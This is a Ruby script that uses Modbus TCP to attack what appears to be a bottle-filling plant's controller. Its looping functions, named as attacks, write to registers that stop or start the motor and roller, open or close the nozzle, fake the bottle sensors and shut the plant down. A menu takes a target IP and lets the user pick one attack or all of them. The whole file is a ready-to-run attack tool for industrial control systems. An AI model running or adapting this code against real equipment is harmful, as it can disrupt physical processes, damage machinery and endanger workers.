require 'rmodbus'

def attack_shutdown(ip)
  client = ModBus::TCPClient.new(ip, 502)
  client.with_slave(1) do |slave|
    loop do
      slave.write_single_register(3, 0)  # Stop the motor
      slave.write_single_register(4, 0)  # Close the nozzle
      slave.write_single_register(16, 0) # Shutdown the plant
    end
  end
end

def attack_shutdown2(ip)
  client = ModBus::TCPClient.new(ip, 502)
  client.with_slave(1) do |slave|
    loop do
      slave.write_single_register(1, 0)  # Bottle is not filled
      slave.write_single_register(2, 0)  # Bottle is not under the nozzle
      slave.write_single_register(3, 0)  # Stop the motor
      slave.write_single_register(4, 0)  # Close the nozzle
      slave.write_single_register(16, 0) # Shutdown the plant
    end
  end
end

def attack_move_fill(ip)
  client = ModBus::TCPClient.new(ip, 502)
  client.with_slave(1) do |slave|
    loop do
      slave.write_single_register(3, 1)  # Start the roller
      slave.write_single_register(4, 1)  # Open the nozzle
      slave.write_single_register(16, 1) # Start the plant
    end
  end
end

def attack_move_fill2(ip)
  client = ModBus::TCPClient.new(ip, 502)
  client.with_slave(1) do |slave|
    loop do
      slave.write_single_register(1, 0)  # Bottle is not filled
      slave.write_single_register(2, 1)  # Bottle is under the nozzle
      slave.write_single_register(3, 1)  # Start the roller
      slave.write_single_register(4, 1)  # Open the nozzle
      slave.write_single_register(16, 1) # Start the plant
    end
  end
end

def attack_stop_fill(ip)
  client = ModBus::TCPClient.new(ip, 502)
  client.with_slave(1) do |slave|
    loop do
      slave.write_single_register(3, 0)  # Stop the roller
      slave.write_single_register(4, 1)  # Open the nozzle
      slave.write_single_register(16, 1) # Start the plant
    end
  end
end

def attack_stop_fill2(ip)
  client = ModBus::TCPClient.new(ip, 502)
  client.with_slave(1) do |slave|
    loop do
      slave.write_single_register(3, 0)  # Stop the motor
      slave.write_single_register(4, 0)  # Close the nozzle
      slave.write_single_register(16, 0) # Shutdown the plant
    end
  end
end

def execute_script(ip, option)
  case option
  when 1
    attack_shutdown(ip)
  when 2
    attack_shutdown2(ip)
  when 3
    attack_move_fill(ip)
  when 4
    attack_move_fill2(ip)
  when 5
    attack_stop_fill(ip)
  when 6
    attack_stop_fill2(ip)
  when 7
    attack_shutdown(ip)
    attack_shutdown2(ip)
    attack_move_fill(ip)
    attack_move_fill2(ip)
    attack_stop_fill(ip)
    attack_stop_fill2(ip)
  else
    puts "Invalid option!"
  end
end

puts "Enter the IP address: "
ip = gets.chomp

puts "Choose an option (enter the corresponding number):"
puts "1 - Attack Shutdown"
puts "2 - Attack Shutdown 2"
puts "3 - Attack Move Fill"
puts "4 - Attack Move Fill 2"
puts "5 - Attack Stop Fill"
puts "6 - Attack Stop Fill 2"
puts "7 - Execute Everything"

option = gets.chomp.to_i

execute_script(ip, option)

